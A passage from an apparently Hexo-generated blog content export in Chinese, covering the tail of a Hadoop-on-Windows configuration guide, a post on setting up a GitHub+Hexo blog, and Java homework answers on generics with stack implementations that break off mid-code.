  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>dfs.namenode.name.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/D:/envs/hadoop-3.3.5/data/namenode<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>fs.checkpoint.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/D:/envs/hadoop-3.3.5/data/snn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>fs.checkpoint.edits.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/D:/envs/hadoop-3.3.5/data/snn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>dfs.datanode.data.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>/D:/envs/hadoop-3.3.5/data/datanode<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="yarn-sitexml"><a class="markdownIt-Anchor" href="#yarn-sitexml"></a> yarn-site.xml</h3>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">&gt;</span></span>

  <span class="token comment">&lt;!-- Site specific YARN configuration properties --&gt;</span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>yarn.nodemanager.aux-services<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>mapreduce_shuffle<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>yarn.nodemanager.auxservices.mapreduce.shuffle.class<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>org.apache.hadoop.mapred.ShuffleHandler<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="hadoop-envcmd"><a class="markdownIt-Anchor" href="#hadoop-envcmd"></a> hadoop-env.cmd</h3>
<p>找到<code>set JAVA_HOME=%JAVA_HOME</code>一行，如果你本来就是JAVA8或者11，不需要改动，如果是17这类，修改为刚才下载的JDK11路径，例如：<code>set JAVA_HOME=%C:\Java\jdk-11%</code></p>
<h3 id="使用winutils替换bin目录"><a class="markdownIt-Anchor" href="#使用winutils替换bin目录"></a> 使用winutils替换bin目录</h3>
<p>复制粘贴就行，版本对上就ok</p>
<h3 id="格式化存储目录"><a class="markdownIt-Anchor" href="#格式化存储目录"></a> 格式化存储目录</h3>
<p>命令行输入：<br>
<code>hdfs namenode -format</code><br>
至此，应当完成配置了</p>
<h2 id="hadoop启动"><a class="markdownIt-Anchor" href="#hadoop启动"></a> Hadoop，启动</h2>
<p>命令行输入start-all.cmd，通过jps应当可以查看到这几个服务：</p>
<img src="/images/posts/pi9G5FS.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/15/pi9G5FS.png'">
<h2 id="服务管理"><a class="markdownIt-Anchor" href="#服务管理"></a> 服务管理</h2>
<h3 id="查看集群节点状态"><a class="markdownIt-Anchor" href="#查看集群节点状态"></a> 查看集群节点状态</h3>
<p><a href="http://127.0.0.1:8088/">http://127.0.0.1:8088/</a></p>
<img src="/images/posts/pi9GzYF.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/15/pi9GzYF.png'">
<h3 id="查看文件管理页面"><a class="markdownIt-Anchor" href="#查看文件管理页面"></a> 查看文件管理页面</h3>
<p><a href="http://127.0.0.1:9870/">http://127.0.0.1:9870/</a></p>
<img src="/images/posts/pi9JSW4.png" alt="" onerror="this.onerror=null; this.src='https://z1.ax1x.com/2023/10/15/pi9JSW4.png'">
]]></content>
      <categories>
        <category>环境</category>
      </categories>
      <tags>
        <tag>Hadoop</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World！</title>
    <url>/2022/09/30/08-59-33/</url>
    <content><![CDATA[<p>刚入学不久我就萌生了写博客的打算，但是当时的打算是在CSDN或者博客园上发布东西的，而且因为一些原因没能时实践下来。现在我使用Github+Hexo的搭配完成了博客网站的搭建。</p>
<span id="more"></span>
<h2 id="为什么会选用githubhexo的方式搭建博客"><a class="markdownIt-Anchor" href="#为什么会选用githubhexo的方式搭建博客"></a> 为什么会选用Github+Hexo的方式搭建博客</h2>
<p>一方面是自己的网站，自由度很高，可以不用去受平台的约束，同时避开平台讨厌的广告和垃圾消息（说的就是你，CSDN）。另一方面，因为我未来打算建立一个自己的站点，这样的方式让我能够学到更多有关网页部署或者其他方面的知识，也方便去做日后的数据迁移。</p>
<h2 id="搭建过程"><a class="markdownIt-Anchor" href="#搭建过程"></a> 搭建过程</h2>
<h3 id="安装git并链接到远程库"><a class="markdownIt-Anchor" href="#安装git并链接到远程库"></a> 安装Git并链接到远程库</h3>
<p>由于网上的教程很丰富，我不在赘述，只将自己遇到的问题写下，如果解决了，我会附上解决方案。</p>
<ul>
<li>务必记得添加个人公钥（gitee）或者是勾选允许写入的选项（Github），否则会无法push</li>
<li>配置username和useremail<code>git config -g username xxx</code>和<code>git config -g useremail xxx</code>。</li>
</ul>
<h3 id="安装nodejs和hexo"><a class="markdownIt-Anchor" href="#安装nodejs和hexo"></a> 安装Node.js和Hexo</h3>
<ul>
<li>遇到npm无法安装的情况就挣扎一下，如果成功了来告诉我，没成功就放弃吧，我浪费了太多时间在解决安装主题后的<code>npm i</code>上了，实在是不想再看到<code>npm audit fix -force</code>了。</li>
<li></li>
</ul>
<h3 id="修改_configyml中的配置文件"><a class="markdownIt-Anchor" href="#修改_configyml中的配置文件"></a> 修改<code>_config.yml</code>中的配置文件</h3>
<ul>
<li>
<p>你可以在<code>_config.yml</code>中找到你想配置的大部分东西，如果没有，可以去主题文件夹的_config.yml中寻找。（初学者就不要改其他的了，我就是没看说明自己瞎搞走了许多弯路）</p>
</li>
<li>
<p>gitee部署直接将所有文件丢上去就完事了，它支持Hexo的生成，但会比较慢。Github上需要修改<code>_config.yml</code>中的url和末尾的deploy。将url改为<code>https://xxxx.github.io/</code>,deploye改成</p>
<pre class="line-numbers language-git" data-language="git"><code class="language-git">deploy:
  type: git
  repo: https://github.com/xxxx/xx.git
  branch: master<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
<p>yaml是一种很严格的语言，你需要注意它的格式要求。</p>
<h3 id="为你的博客添加背景或头像等图片"><a class="markdownIt-Anchor" href="#为你的博客添加背景或头像等图片"></a> 为你的博客添加背景或头像等图片</h3>
<ul>
<li>将你的图片上传到图床，有许多免费的产品，在此就不推荐了。</li>
</ul>
]]></content>
      <categories>
        <category>博客改动</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>blog</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-1</title>
    <url>/2023/09/12/02-26-30/</url>
    <content><![CDATA[<p>使用泛型类型的优势是什么？<br>
使用什么样的语法来声明一个使用原始类型的ArrayList引用变量，以及将一个原始类型的ArrayList对象赋值给该变量？<br>
什么是非受限通配、受限通配、下限通配？<br>
······</p>
<span id="more"></span>
<h2 id="使用泛型类型的优势是什么"><a class="markdownIt-Anchor" href="#使用泛型类型的优势是什么"></a> 使用泛型类型的优势是什么？</h2>
<p>泛型可以在编译时就发现错误</p>
<h2 id="使用什么样的语法来声明一个使用原始类型的arraylist引用变量以及将一个原始类型的arraylist对象赋值给该变量"><a class="markdownIt-Anchor" href="#使用什么样的语法来声明一个使用原始类型的arraylist引用变量以及将一个原始类型的arraylist对象赋值给该变量"></a> 使用什么样的语法来声明一个使用原始类型的ArrayList引用变量，以及将一个原始类型的ArrayList对象赋值给该变量？</h2>
<p>声明一个使用原始类型的ArrayList引用变量: <code>ArrayList rawList</code>;<br>
将一个原始类型的ArrayList对象赋值给该变量: <code>rawList = new ArrayList()</code>;</p>
<h2 id="什么是非受限通配-受限通配-下限通配"><a class="markdownIt-Anchor" href="#什么是非受限通配-受限通配-下限通配"></a> 什么是非受限通配、受限通配、下限通配？</h2>
<p>这三种通配类型可以对一个泛型类型指定范围。T为泛型类型</p>
<table>
<thead>
<tr>
<th>通配类型</th>
<th>形式</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>非受限通配</td>
<td>?</td>
<td>等同于? extends object</td>
</tr>
<tr>
<td>受限通配</td>
<td>? extends T</td>
<td>表示T或T的一个子类型</td>
</tr>
<tr>
<td>下限通配</td>
<td>? super T</td>
<td>表示T或T的一个父类型</td>
</tr>
</tbody>
</table>
<h2 id="什么是消除为什么使用消除来实现java泛型"><a class="markdownIt-Anchor" href="#什么是消除为什么使用消除来实现java泛型"></a> 什么是消除？为什么使用消除来实现Java泛型？</h2>
<p>“消除”（Erasure）是Java泛型（Generics）实现的一种机制。在Java中，泛型是一种允许在编译时进行类型检查的机制，但是在运行时，这些类型信息会被移除或“擦除”，这就是所谓的类型擦除（Type Erasure）。</p>
<ol>
<li>向后兼容性：Java泛型是在Java 5中引入的，而Java已经有了很多版本和大量的代码库。使用类型擦除可以确保新代码能与旧代码库和旧版本的Java虚拟机（JVM）兼容。</li>
<li>运行时性能：由于类型信息在运行时被擦除，这意味着没有额外的运行时开销，因此不会影响程序的性能。</li>
<li>简化虚拟机设计：类型擦除意味着Java虚拟机（JVM）不需要进行大量的修改就可以支持泛型。</li>
<li>代码复用：类型擦除允许在运行时使用相同的代码来处理不同的类型，从而提高代码复用性。</li>
<li>类型安全：尽管类型信息在运行时被擦除，但在编译时，编译器会进行严格的类型检查，确保类型安全。</li>
</ol>
<p>然而，类型擦除也有其局限性和缺点，例如无法在运行时获取泛型类型信息，以及某些复杂的泛型操作可能需要使用通配符或其他复杂的语法。<br>
总体而言，类型擦除是Java为了平衡向后兼容性、性能和复杂性而采取的一种妥协方案。</p>
<h2 id="修改genericstack类使用数组而不是arraylist来实现他-应该在给栈添加新元素之前检查数组的大小-如果数组满了就创建一个新数组-该数组是当前数组大小的两倍然后将当前数组的元素复制到新数组中"><a class="markdownIt-Anchor" href="#修改genericstack类使用数组而不是arraylist来实现他-应该在给栈添加新元素之前检查数组的大小-如果数组满了就创建一个新数组-该数组是当前数组大小的两倍然后将当前数组的元素复制到新数组中"></a> 修改GenericStack类，使用数组而不是ArrayList来实现他。应该在给栈添加新元素之前检查数组的大小。如果数组满了，就创建一个新数组。该数组是当前数组大小的两倍，然后将当前数组的元素复制到新数组中</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenericStack1</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> list<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">DEFAULT_CAPACITY</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">GenericStack1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token constant">DEFAULT_CAPACITY</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> size<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span> <span class="token comment">// 或抛出异常</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span> list<span class="token punctuation">[</span>size <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token string">"unchecked"</span><span class="token punctuation">)</span>
    <span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token class-name">E</span> element <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">E</span><span class="token punctuation">)</span> list<span class="token punctuation">[</span><span class="token operator">--</span>size<span class="token punctuation">]</span><span class="token punctuation">;</span>
        list<span class="token punctuation">[</span>size<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> element<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">E</span> element<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>size <span class="token operator">==</span> list<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">ensureCapacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        list<span class="token punctuation">[</span>size<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> element<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">ensureCapacity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">int</span> newCapacity <span class="token operator">=</span> list<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">;</span>
        <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> newList <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span>newCapacity<span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">arraycopy</span><span class="token punctuation">(</span>list<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> newList<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> list<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        list <span class="token operator">=</span> newList<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="使用继承实现genericstack程序清单19-1中genericstack是使用组合实现的-定义一个新的继承自arraylist的栈类-实现genericstack-编写一个测试程序提示用户输人5个字符串然后以逆序显示它们"><a class="markdownIt-Anchor" href="#使用继承实现genericstack程序清单19-1中genericstack是使用组合实现的-定义一个新的继承自arraylist的栈类-实现genericstack-编写一个测试程序提示用户输人5个字符串然后以逆序显示它们"></a> (使用继承实现GenericStack)程序清单19-1中，GenericStack是使用组合实现的。定义一个新的继承自ArrayList的栈类。实现GenericStack。编写一个测试程序，提示用户输人5个字符串，然后以逆序显示它们</h2>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">code</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>function<span class="token punctuation">.</span></span><span class="token class-name">Consumer</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">GenericStack2</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token keyword">extends</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Scanner</span> scanner <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">GenericStack2</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span> stack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GenericStack2</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"请输入5个字符串："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"第"</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"个："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>scanner<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        scanner<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stack<span class="token punctuation">.</span><span class="token function">printAllRerseve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        stack<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span>element <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token namespace">stack<span class="token punctuation">.</span></span>Iterate</span><span class="token punctuation">(</span>element <span class="token operator">-&gt;</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">E</span> element<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">add</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">peek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">printAllRerseve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">get</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 其实可以直接用ArrayList的isEmpty</span>
    <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">forEach</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">E</span> element <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            action<span class="token punctuation">.</span><span class="token function">accept</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token class-name">Iterate</span><span class="token punctuation">(</span><span class="token class-name">Consumer</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> action<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">E</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
